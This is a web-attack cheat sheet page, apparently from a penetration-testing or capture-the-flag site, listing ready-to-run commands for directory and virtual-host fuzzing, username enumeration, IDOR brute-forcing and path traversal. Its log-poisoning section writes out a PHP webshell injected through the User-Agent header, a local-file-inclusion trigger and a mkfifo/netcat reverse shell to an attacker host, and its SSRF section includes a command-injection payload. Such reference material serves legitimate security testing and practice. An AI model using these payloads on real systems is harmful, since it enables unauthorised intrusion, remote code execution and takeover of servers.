---
layout: page
title: Web
permalink: /cheatsheets/web/
---

## Directory Fuzzing

### Basic directory fuzz
```bash
ffuf -u http://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```

### With file extensions
```bash
ffuf -u http://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php,.html,.txt
```

### Filter by response size
```bash
ffuf -u http://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs <SIZE>
```

## Virtual Host Discovery

### vHost fuzzing (HTTP)
```bash
ffuf -u http://<IP> -H "Host: FUZZ.<DOMAIN>" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw <WORDS>
```

### vHost fuzzing (HTTPS)
```bash
ffuf -u https://<IP> -H "Host: FUZZ.<DOMAIN>" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw <WORDS>
```

## HTTP Probing

### Check response headers
```bash
curl -I http://<TARGET>
curl -kI https://<TARGET>
```

### Inspect JSON API response
```bash
curl http://<TARGET>/api/endpoint | jq
```

### Grab version from XML
```bash
curl http://<TARGET>/administrator/manifests/files/joomla.xml | grep version
```

## Log Poisoning

### Inject PHP webshell into User-Agent (Apache log)
```bash
curl -X POST http://<IP> -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

### Trigger via LFI
```bash
curl "http://<TARGET>/page.php?file=/var/log/apache2/access.log&cmd=id"
```

### Reverse shell via User-Agent injection
```bash
curl -X POST http://<IP> -H "User-Agent: <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f'); ?>"
```

## SSRF

### Basic SSRF probe
```bash
curl http://<TARGET>/endpoint --data "url=http://<LHOST>:<LPORT>"
```

### Time-based SSRF / command injection check
```bash
time curl http://<TARGET>/endpoint --data "param=;`sleep 5`#"
```

## Username Enumeration

### POST-based username fuzzing
```bash
ffuf -X POST -u http://<TARGET>/login.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=test" \
  -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -fr "User not found"
```

## IDOR / Parameter Fuzzing

### Numeric ID brute-force
```bash
seq 1 10000 > ids.txt
ffuf -u "http://<TARGET>/download.php?id=FUZZ" -w ids.txt -fs <SIZE>
```

## Path Traversal

### Basic path traversal fuzz
```bash
ffuf -u "https://<TARGET>/includes/img.php?path=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0,30
```
